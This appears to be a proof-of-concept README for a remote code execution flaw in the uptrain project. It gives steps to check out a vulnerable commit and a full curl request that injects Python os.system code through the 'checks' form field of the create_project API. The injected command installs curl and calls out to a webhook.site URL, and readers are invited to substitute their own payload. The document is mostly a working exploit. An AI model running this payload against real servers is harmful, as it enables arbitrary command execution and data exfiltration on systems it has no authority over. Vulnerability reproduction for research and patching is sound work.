# vulnerable instance setup
1. Install the vulnerable instance by running the following command:
```bash
git clone https://github.com/uptrain-ai/uptrain
cd uptrain
# for compatibility with the RCE vulnerability, checkout the commit that still has the vulnerability
git checkout a31cc14eddcb6c0b0b12cbed15f086d98c441c6f
bash run_uptrain.sh
```
open http://localhost:3000 in your browser.

## Exploiting the Vulnerability
To demonstrate the vulnerability, you can send an HTTP request to execute arbitrary code on the server.
### Example
The example payload below runs a shell command to update packages, install `curl`, and send a webhook request. you can replace `apt update && apt install curl -y && curl https://webhook.site/` with your own payload.

```bash
 curl 'http://localhost:4300/api/public/create_project' -H'uptrain-access-token: default_key' -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysFz2W1h9iMH4IFs9'  --data-raw $'------WebKitFormBoundarysFz2W1h9iMH4IFs9\r\nContent-Disposition: form-data; name="model"\r\n\r\ngpt-3.5-turbo\r\n------WebKitFormBoundarysFz2W1h9iMH4IFs9\r\nContent-Disposition: form-data; name="project_name"\r\n\r\nasdf\r\n------WebKitFormBoundarysFz2W1h9iMH4IFs9\r\nContent-Disposition: form-data; name="checks"\r\n\r\n__import__(\'os\').system(\'apt update && apt install curl -y && curl https://webhook.site/a1da66a1-0b5f-4f45-8481-60472e56a798
\')\r\n------WebKitFormBoundarysFz2W1h9iMH4IFs9\r\nContent-Disposition: form-data; name="dataset_name"\r\n\r\nasdf\r\n------WebKitFormBoundarysFz2W1h9iMH4IFs9\r\nContent-Disposition: form-data; name="data_file"; filename="test.jsonl"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundarysFz2W1h9iMH4IFs9\r\nContent-Disposition: form-data; name="metadata"\r\n\r\n{"gpt-3.5-turbo":{"openai_api_key":"asdf"}}\r\n------WebKitFormBoundarysFz2W1h9iMH4IFs9--\r\n'
```